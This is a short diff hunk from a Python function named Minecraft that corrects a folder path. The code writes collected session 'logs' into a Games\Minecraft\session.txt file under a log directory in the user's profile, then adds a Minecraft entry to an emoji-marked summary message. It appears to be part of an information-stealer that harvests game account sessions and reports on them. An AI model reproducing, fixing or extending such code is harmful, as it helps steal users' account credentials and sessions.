@@ -27,7 +27,7 @@ def Minecraft():
                 user = environ['USERPROFILE']
                 pathtofile = f'{user}\\{config.pathToLogs}'
                 try:
-                    makedirs(f'{pathtofile}\\Games\\\Minecraft')
+                    makedirs(f'{pathtofile}\\Games\\Minecraft')
                     with open(f'{pathtofile}\\Games\\Minecraft\\session.txt',"w") as file:
                         file.write(logs)
                     msgInfo+="\n∟🎮Minecraft"
